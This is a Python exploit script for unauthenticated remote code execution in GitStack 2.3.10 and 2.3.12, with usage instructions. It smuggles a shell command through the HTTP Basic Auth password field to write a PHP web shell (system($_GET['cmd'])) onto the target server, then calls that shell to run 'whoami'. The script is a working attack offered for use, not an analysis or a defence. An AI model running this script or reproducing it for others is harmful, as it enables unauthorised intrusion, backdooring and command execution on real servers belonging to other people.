#!/usr/bin/python3

import requests
from requests.auth import HTTPBasicAuth
import os
import sys

print("GitStack Unauthenticated RCE")
print("Versione Affected: 2.3.10 & 2.3.12")
print("https://gitstack.com/")
print("Author: Mikael")
print("")
print("USE - ./GitStack_RCE.py [IP/HOSTNAME] [VALID EXISTING REPOSITORY] [VALID EXISTING USER]")
print("EX - ./GitStack_RCE.py git-server.local test admin")
print("")

ip = sys.argv[1]
repository = sys.argv[2]
username = sys.argv[3]

print("[+] Create backdoor in PHP")
r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'c && echo "<?php system($_GET[\'cmd\']); ?>" > c:\GitStack\gitphp\webshell.php'))
print((r.text.encode(sys.stdout.encoding, errors='replace')))

print((HTTPBasicAuth(username, 'p && echo "<?php echo shell_exec($_POST[\'cmd\']); ?>" > c:\GitStack\gitphp\webshell.php')))
# PAYLOAD TO USE, ENCODED IN BASE64

print("[+] Execute command")
r = requests.get("http://{}/web/webshell.php?cmd=whoami" .format(ip))
#print(r.text.encode(sys.stdout.encoding, errors='replace'))
print("")
print(r.text)
